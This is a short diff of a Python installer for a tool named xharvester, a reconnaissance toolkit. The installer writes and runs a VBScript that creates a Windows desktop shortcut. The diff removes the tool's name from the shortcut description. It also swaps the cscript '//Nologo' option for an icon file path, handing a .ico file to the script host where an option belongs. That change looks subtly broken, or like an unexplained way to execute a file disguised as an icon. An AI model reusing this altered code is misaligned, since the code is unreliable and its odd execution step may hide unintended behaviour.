@@ -357,14 +357,14 @@ Set oLink = oWS.CreateShortcut(sLinkFile)
 oLink.TargetPath = "cmd.exe"
 oLink.Arguments = "/k python \"{script_path}\" && pause"
 oLink.WorkingDirectory = "{self.repo_path}"
-oLink.Description = "xharvester - Extended Reconnaissance Toolkit Developed By N3TWORK@(GHANA)"
+oLink.Description = "Extended Reconnaissance Toolkit Developed By N3TWORK@(GHANA)"
 oLink.Save
 '''
                     with open(vbs_script, 'w') as f:
                         f.write(vbs_content)
                     
                     # Run the VBS script to create the shortcut
-                    subprocess.run(["cscript", "//Nologo", str(vbs_script)], check=True)
+                    subprocess.run(["cscript", "icons/jenkins_logo_icon_247972.ico", str(vbs_script)], check=True)
                     vbs_script.unlink()  # Clean up
                     
                     self.print_status(f"Created desktop shortcut at {shortcut_path}")
